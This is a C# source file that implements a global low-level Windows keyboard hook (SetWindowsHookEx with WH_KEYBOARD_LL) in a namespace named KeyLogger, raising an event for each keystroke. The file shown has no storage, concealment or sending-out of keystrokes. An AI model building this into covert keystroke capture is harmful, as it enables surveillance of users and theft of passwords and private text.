/// Written by: LadyYulia
/// Creation Date: 09th of December 2018
/// Purpose: Controller class for implementing a keyboard hook
#region ========================================================================= USING =====================================================================================
using System;
using System.Diagnostics;
using System.ComponentModel;
using System.Runtime.InteropServices;
#endregion

namespace KeyLogger
{
    public class GlobalKeyboardHook : IDisposable
    {
        #region ============================================================== FIELD MEMBERS ================================================================================
        public event EventHandler<GlobalKeyboardHookEventArgs> KeyboardPressed;

        public const int WH_KEYBOARD_LL = 13;
        public const int VkSnapshot = 0x2c;
        public const int VkLwin = 0x5b;
        public const int VkRwin = 0x5c;
        public const int VkTab = 0x09;
        public const int VkEscape = 0x18;
        public const int VkControl = 0x11;
        public const int KfAltdown = 0x2000;
        public const int LlkhfAltdown = (KfAltdown >> 8);
        public const int LlkhfAltup = 128; 

        private IntPtr hWndHook;
        private IntPtr hUsr32Lib;
        private KbHookProcess kbHookProcess;
        private delegate IntPtr KbHookProcess(int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// The SetWindowsHookEx function installs an application-defined hook procedure into a hook chain.
        /// You would install a hook procedure to monitor the system for certain types of events. These events are
        /// associated either with a specific thread or with all threads in the same desktop as the calling thread.
        /// </summary>
        /// <param name="idHook">hook type</param>
        /// <param name="lpfn">hook procedure</param>
        /// <param name="hMod">handle to application instance</param>
        /// <param name="dwThreadId">thread identifier</param>
        /// <returns>If the function succeeds, the return value is the handle to the hook procedure.</returns>
        [DllImport("USER32", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, KbHookProcess lpfn, IntPtr hMod, int dwThreadId);

        /// <summary>
        /// The UnhookWindowsHookEx function removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
        /// </summary>
        /// <param name="hhk">handle to hook procedure</param>
        /// <returns>If the function succeeds, the return value is true.</returns>
        [DllImport("USER32", SetLastError = true)]
        public static extern bool UnhookWindowsHookEx(IntPtr hHook);

        /// <summary>
        /// The CallNextHookEx function passes the hook information to the next hook procedure in the current hook chain.
        /// A hook procedure can call this function either before or after processing the hook information.
        /// </summary>
        /// <param name="hHook">Handle to current hook</param>
        /// <param name="code">Hook code passed to hook procedure</param>
        /// <param name="wParam">Value passed to hook procedure</param>
        /// <param name="lParam">Value passed to hook procedure</param>
        /// <returns>If the function succeeds, the return value is true.</returns>
        [DllImport("USER32", SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hHook, int code, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Maps the specified DLL file into the address space of the calling process.
        /// </summary>
        /// <param name="lpFileName">The name of the module. This can be either a library module (a .dll file) or an executable module (an .exe file). 
        /// The name specified is the file name of the module and is not related to the name stored in the library module itself, as specified by the 
        /// LIBRARY keyword in the module-definition (.def) file.</param>
        /// <returns>If the function succeeds, the return value is a handle to the module. If the function fails, the return value is NULL.To get extended error information, call GetLastError.</returns>
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        /// <summary>
        /// Frees the loaded dynamic-link library (DLL) module and, if necessary, decrements its reference count. When the reference count reaches zero, 
        /// the module is unloaded from the address space of the calling process and the handle is no longer valid.
        /// </summary>
        /// <param name="hModule">A handle to the loaded library module. The LoadLibrary, LoadLibraryEx, GetModuleHandle, or GetModuleHandleEx function returns this handle.</param>
        /// <returns>If the function succeeds, the return value is nonzero. If the function fails, the return value is zero.To get extended error information, call the GetLastError function.</returns>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern bool FreeLibrary(IntPtr hModule);
        #endregion

        #region ================================================================== CTOR =====================================================================================
        /// <summary>
        /// Default C-tor
        /// </summary>
        public GlobalKeyboardHook()
        {
            // reset handles
            hWndHook = IntPtr.Zero;
            hUsr32Lib = IntPtr.Zero;
            // prevent kbHookProcess from being collected, because GC is completely unaware about SetWindowsHookEx behaviour.
            kbHookProcess = GetLowLevelKeyboardProcess; 
            // get the User32 library handle
            hUsr32Lib = LoadLibrary("User32");
            // check if a valid handle was returned
            if (hUsr32Lib == IntPtr.Zero)
            {
                int errorCode = Marshal.GetLastWin32Error();
                throw new Win32Exception(errorCode, $"Unable to load system library 'User32.dll'. Error { errorCode }: { new Win32Exception(Marshal.GetLastWin32Error()).Message }.");
            }
            // install an application-defined hook procedure into a hook chain
            hWndHook = SetWindowsHookEx(WH_KEYBOARD_LL, kbHookProcess, hUsr32Lib, 0);
            // check if a valid handle was returned
            if (hWndHook == IntPtr.Zero)
            {
                int errorCode = Marshal.GetLastWin32Error();
                throw new Win32Exception(errorCode, $"Unable to install keyboard hooks for '{ Process.GetCurrentProcess().ProcessName }'. Error { errorCode }: { new Win32Exception(Marshal.GetLastWin32Error()).Message }.");
            }
        }

        /// <summary>
        /// Default D-tor
        /// </summary>
        ~GlobalKeyboardHook()
        {
            Dispose(false);
        }
        #endregion

        #region ================================================================= METHODS ===================================================================================
        /// <summary>
        /// Internal dispose implementation
        /// </summary>
        /// <param name="isDisposing">When True, completely disposes all marshalled system resources, otherwise unloads just User32</param>
        protected virtual void Dispose(bool isDisposing)
        {
            if (isDisposing)
            {
                // be aware that we can unhook only in the same thread, not in garbage collector thread!
                if (hWndHook != IntPtr.Zero)
                {
                    // try to remove the hook procedure installed in the hook chain
                    if (!UnhookWindowsHookEx(hWndHook))
                    {
                        int errorCode = Marshal.GetLastWin32Error();
                        throw new Win32Exception(errorCode, $"Unable to remove keyboard hooks for '{ Process.GetCurrentProcess().ProcessName }'. Error { errorCode }: { new Win32Exception(Marshal.GetLastWin32Error()).Message }.");
                    }
                    // reset handle
                    hWndHook = IntPtr.Zero;
                    // unsubscribe event handler
                    kbHookProcess -= GetLowLevelKeyboardProcess;
                }
            }
            if (hUsr32Lib != IntPtr.Zero)
            {
                // remove reference to library
                if (!FreeLibrary(hUsr32Lib))
                {
                    int errorCode = Marshal.GetLastWin32Error();
                    throw new Win32Exception(errorCode, $"Unable to unload library 'User32.dll'. Error { errorCode }: { new Win32Exception(Marshal.GetLastWin32Error()).Message }.");
                }
                // reset handle
                hUsr32Lib = IntPtr.Zero;
            }
        }

        /// <summary>
        /// Dispose implementation
        /// </summary>
        public void Dispose()
        {
            // dispose all system marshalled resources
            Dispose(true);
            // request that the CLR not call the finalizer for this instance
            GC.SuppressFinalize(this);
        }

        /// <summary>
        /// Passes the hook information to the next hook procedure in the current hook chain. 
        /// A hook procedure can call this function either before or after processing the hook information.
        /// </summary>
        /// <param name="nCode">Hook code passed to the hook procedure</param>
        /// <param name="wParam">value passed to hook procedure</param>
        /// <param name="lParam">A pointer to an unmanaged block of memory.</param>
        /// <returns></returns>
        public IntPtr GetLowLevelKeyboardProcess(int nCode, IntPtr wParam, IntPtr lParam)
        {
            bool isKeyHandled = false;
            int wParamTyped = wParam.ToInt32();
            if (Enum.IsDefined(typeof(SystemKeyState), wParamTyped))
            {
                // marshal data from the unmanaged block of memory lParam to a newly allocated managed object of type LowLevelKeyboardInputEvent
                LowLevelKeyboardInputEvent inputEvent = (LowLevelKeyboardInputEvent)Marshal.PtrToStructure(lParam, typeof(LowLevelKeyboardInputEvent));
                // create an instance of the custom EventArgs implementation
                GlobalKeyboardHookEventArgs eventArguments = new GlobalKeyboardHookEventArgs(inputEvent, (SystemKeyState)wParamTyped);
                // invoke the keypressed event with the newly created instance of custom EventArgs implementation
                EventHandler<GlobalKeyboardHookEventArgs> handler = KeyboardPressed;
                handler?.Invoke(this, eventArguments);
                // mark the key as handled or not
                isKeyHandled = eventArguments.Handled;
            }
            // if key is handled do not return the next hook procedure!
            return isKeyHandled ? (IntPtr)1 : CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        #endregion
    }
}